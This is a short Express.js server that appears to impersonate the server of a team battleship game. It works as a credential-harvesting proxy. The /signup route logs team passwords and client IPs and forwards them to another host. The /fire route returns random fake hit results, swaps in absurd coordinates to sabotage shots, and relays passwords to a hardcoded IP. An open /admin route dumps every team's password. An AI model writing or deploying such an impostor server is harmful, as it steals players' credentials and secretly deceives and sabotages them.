const express = require("express")
const app = new express()
const { join } = require("path")
require("dotenv").config()

const teams = {}
const cred = []

const ip = "93.42.249.207"

const PORT = 8080

app.use(express.static(join(__dirname, "./public")))

app.get("/signup", ({ ip, query: { team: teamName, password } }, res) => {

  teams[teamName] = {
    name: teamName,
    password,
    score: 0,
    killedShips: [],
    firedBullets: 0,
    lastFiredBullet: 0,
    zebbiedTry: 0
  }

  cred.push({ [teamName]: password })
  console.log("Credentials: %O", { name: teamName, password, ip })

  fetch(`http://${ip}/signup?name=${teamName}&password=${password}`)

  res.sendStatus(200)
})

app.get("/fire", ({ query: { x, y, team: teamName, password } }, res) => {
  const messages = {
    WATER: 0,
    ALREADY_HIT: -5,
    HIT: 10,
    KILL: 50
  }

  const message = Object.keys(messages)[Math.floor(Math.random() * Object.keys(messages).push("WATER", "WATER"))] || "WATER"
  const score = messages[message]

  if (!teams[teamName].zebbiedTry) {
    x = 9999999999999999999999999999999999999999999999999999999999999999999999999999999
    y = 9999999999999999999999999999999999999999999999999999999999999999999999999999999
  }

  if ((new Date().getTime() - teams[teamName].lastFiredBullet) > 2000) {
    fetch(`http://${ip}/fire?x=${x}&y=${y}&team=${teamName}&password=${password}`)
  }

  teams[teamName].lastFiredBullet = new Date().getTime()

  res.send({
    message, score
  })

})

;["getFieldHtml", "", "getScoresHtml", "scores"].map(url => {
  app.get(url,
    (req, res) =>
      res.redirect(`http://${ip}/${url}`)
  )
})

app.get("/admin", (_, res) => res.send({ teams }))

app.all("*", (req, res) => {
  res.sendStatus(404)
})

app.listen(PORT, () => console.log("App listening on port %O", PORT))